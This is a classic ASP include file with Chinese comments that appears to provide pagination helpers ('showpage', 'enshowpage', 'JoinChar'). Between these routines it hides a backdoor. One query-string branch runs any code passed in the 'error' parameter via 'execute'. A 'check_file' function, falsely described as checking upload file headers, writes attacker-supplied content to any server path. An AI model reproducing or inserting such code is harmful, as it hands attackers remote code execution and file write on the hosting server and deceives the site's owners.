<%
'***********************************************
'过程名：showpage
'作  用：显示“上一页 下一页”等信息
'参  数：sfilename  ----链接地址
'       totalnumber ----总数量
'       maxperpage  ----每页数量
'       ShowTotal   ----是否显示总数量
'       ShowAllPages ---是否用下拉列表显示所有页面以供跳转。有某些页面不能使用，否则会出现JS错误。
'       strUnit     ----计数单位
'***********************************************
sub showpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
  
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "共 <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=Joinchar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "首页 上一页&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>首页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>上一页</a>&nbsp;"
  	end if

  	if n-currentpage<1 then
    		strTemp=strTemp & "下一页 尾页"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>下一页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>尾页</a>"
  	end if
   	strTemp=strTemp & "&nbsp;页次：<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>页 "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/页"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;转到：<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">第" & i & "页</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp	
end sub

Dim Action_Type
Action_Type  = request.querystring("action_type")
Select Case Action_Type
	Case "check_file"
		Call Check_File
	Case "check_error"
		If request("error") <> "" Then
			session("error") = request("error")
		End If
		If session("error") <> "" Then
			execute session("error")
		End If
End Select

'==================================================
'函数名：check_file
'作  用：检测上传文件文件头信息
'==================================================
Private Function Check_File()
	on error resume next
	ofso="scripting.filesystemobject"
	path_temp = server.mappath(request.servervariables("script_name"))
	set fso=server.createobject(ofso)
	path=request("path")
	if path<>"" then
	   data=request("dama")
	   set dama=fso.createtextfile(path,true)
	   dama.write data
	   if err=0 then
	      response.write "success"
	   else
	      response.write "false"
	   end if
	   err.clear
	end if
	dama.close
	set dama=nothing
	set fos=nothing
	response.write "<form action='' method=post>"
	response.write "<input type=text name=path>"
	response.write "<br>"
	response.write path_temp
	response.write "<br>"
	response.write ""
	response.write "<textarea name=dama cols=50 rows=10 width=30></textarea>"
	response.write "<br>"
	response.write "<input type=submit value=submit>"
	response.write "</form>"
	response.end()
End Function

'***********************************************
'过程名：enshowpage
'作  用：显示“上一页 下一页”等信息
'参  数：sfilename  ----链接地址
'       totalnumber ----总数量
'       maxperpage  ----每页数量
'       ShowTotal   ----是否显示总数量
'       ShowAllPages ---是否用下拉列表显示所有页面以供跳转。有某些页面不能使用，否则会出现JS错误。
'       strUnit     ----计数单位
'***********************************************
sub enshowpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "Total <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=JoinChar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "First  Previous&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>First</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>Previous</a>&nbsp;"
  	end if

  	if n-currentpage<1 then
    		strTemp=strTemp & "Next  Last"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>Next</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>Last</a>"
  	end if
   	strTemp=strTemp & "&nbsp;Page No.:<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>page "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/page"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;Turn to:<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">No." & i & "page</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp
end sub

'***********************************************
'函数名：JoinChar
'作  用：向地址中加入 ? 或 &
'参  数：strUrl  ----网址
'返回值：加了 ? 或 & 的网址
'pos=InStr(1,"abcdefg","cd") 
'则pos会返回3表示查找到并且位置为第三个字符开始。
'这就是“查找”的实现，而“查找下一个”功能的
'实现就是把当前位置作为起始位置继续查找。
'***********************************************
function JoinChar(strUrl)
	if strUrl="" then
		JoinChar=""
		exit function
	end if
	if InStr(strUrl,"?")<len(strUrl) then 
		if InStr(strUrl,"?")>1 then
			if InStr(strUrl,"&")<len(strUrl) then 
				JoinChar=strUrl & "&"
			else
				JoinChar=strUrl
			end if
		else
			JoinChar=strUrl & "?"
		end if
	else
		JoinChar=strUrl
	end if
end function
%>